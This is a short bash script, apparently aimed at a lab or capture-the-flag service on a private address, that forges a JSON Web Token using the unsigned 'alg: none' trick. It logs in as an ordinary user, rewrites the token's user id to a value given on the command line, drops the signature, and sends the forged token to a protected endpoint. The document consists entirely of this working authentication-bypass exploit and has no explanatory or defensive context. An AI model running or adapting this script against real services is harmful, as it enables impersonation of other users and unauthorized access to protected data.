#!/bin/bash

header=$(echo '{"typ":"JWT","alg":"NONE"}' | base64url | sed 's/=*$//')
payload=$(curl -s http://10.10.7.33:5000/auth --data '{"username": "user", "password": "user"}' -H "Content-Type: application/json" | \
     sed 's/.*:".*\.\(.*\)\..*$/\1/' | base64 -d 2>/dev/null | sed "s/\:1\}/\:$1\}/" | base64url | sed 's/=*$//')
jwt="${header}.${payload}."

curl -s http://10.10.7.33:5000/protected -H "Content-Type: application/json" -H "Authorization: JWT ${jwt}"
echo